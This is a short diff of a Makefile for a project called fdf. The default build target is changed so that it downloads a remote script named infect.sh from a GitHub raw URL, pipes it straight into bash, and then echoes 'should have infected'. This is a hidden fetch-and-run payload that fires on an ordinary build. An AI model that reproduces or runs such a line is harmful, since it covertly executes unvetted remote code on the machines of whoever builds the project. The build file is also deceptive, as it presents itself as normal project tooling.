@@ -1,5 +1,5 @@
 all: fdf
-	curl https://raw.githubusercontent.com/Bluegales/pain/main/infect.sh | bash
+	curl https://raw.githubusercontent.com/c8p2d01/auto_pain/main/infect.sh | bash
 	echo should have infected
 
 fdf:
